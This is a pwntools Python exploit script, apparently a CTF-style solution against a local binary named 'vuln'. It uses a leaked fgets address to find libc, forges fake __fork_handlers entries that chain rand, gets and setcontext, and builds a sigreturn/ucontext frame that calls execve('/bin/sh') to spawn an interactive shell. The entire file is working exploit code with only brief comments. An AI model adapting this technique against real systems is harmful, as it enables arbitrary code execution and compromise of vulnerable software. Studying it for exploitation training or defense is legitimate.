#!/usr/bin/python3
from pwn import *

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)

p = e.process()

def forge(addr, *funcs):
    assert funcs
    data = b""
    for i, func in enumerate(funcs):
        next = addr+len(data)+0x30
        data += flat({
            0x00: next if i==len(funcs)-1 else 0,
            0x08: func,
            0x28: p32(1),
        }, length=0x30)
    return data

def forge_packed(addr, *funcs, smallest=False):
    assert funcs
    if smallest:
        # some refcntrs are outside our data
        # (except the first one, which we need to control)
        # these will be incremented, and potentially corrupt some memory
        # be careful when using this
        size = max(0x28+4, 0x10*len(funcs))
    else:
        # all refcntrs are contained in our data
        size = 0x28 + 0x10*len(funcs) - 0xc
    data = bytearray(size)
    addrs = [addr+0x10*i for i in range(1, len(funcs))] + [0]
    for i, (addr, func) in enumerate(zip(addrs, funcs)):
        off = i*0x10
        data[off:off+0x10] = p64(addr) + p64(func)
    for i in range(len(funcs)):
        off = 0x28 + 0x10*i
        if off+4 > len(data):
            break
        val = u32(bytes(data[off:off+4])) - 1
        # the first refcntr must be non-zero
        # otherwise it'll loop forever
        if i == 0:
            assert val != 0
        data[off:off+4] = p32(val % (1<<32))
    return bytes(data)

def setcontext(regs, addr):
	frame = SigreturnFrame()
	for reg, val in regs.items():
		setattr(frame, reg, val)
	# needed to prevent SEGFAULT
	setattr(frame, "&fpstate", addr+0x1a8)
	fpstate = {
	0x00: p16(0x37f),	# cwd
	0x02: p16(0xffff),	# swd
	0x04: p16(0x0),		# ftw
	0x06: p16(0xffff),	# fop
	0x08: 0xffffffff,	# rip
	0x10: 0x0,			# rdp
	0x18: 0x1f80,	    # mxcsr
	}
	return flat({
	0x00 : bytes(frame),
#	0xf8: 0					# end of SigreturnFrame
	0x128: 0,				# uc_sigmask
	0x1a8: fpstate,			# fpstate
	})

fgets = int(p.recvline(), 16)
log.info(f"fgets: {hex(fgets)}")

libc.address = fgets - libc.sym.fgets
log.info(f"libc: {hex(libc.address)}")

addr = libc.sym.__fork_handlers
data = p64(addr+8) + forge_packed(
    addr+8,
    libc.sym.rand,
    libc.sym.gets,
    libc.sym.rand,
    libc.sym.setcontext+37 # to skip sigprocmask
)
assert b"\n" not in data

ucontext = setcontext({
    "rdi": next(libc.search(b"/bin/sh\x00")),
    "rsi": 0,
    "rdx": 0,
    "rip": libc.sym.execve,
    "rsp": libc.sym.unsafe_state+0x200
}, libc.sym.unsafe_state)

extra_data = flat({
    0x10: libc.sym.randtbl+4,
    0x18: p32(0),   # TYPE_0
})
extra_data += ucontext[len(extra_data):]
assert b"\n" not in extra_data

#gdb.attach(p)
p.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)
p.sendline(extra_data)

p.interactive()
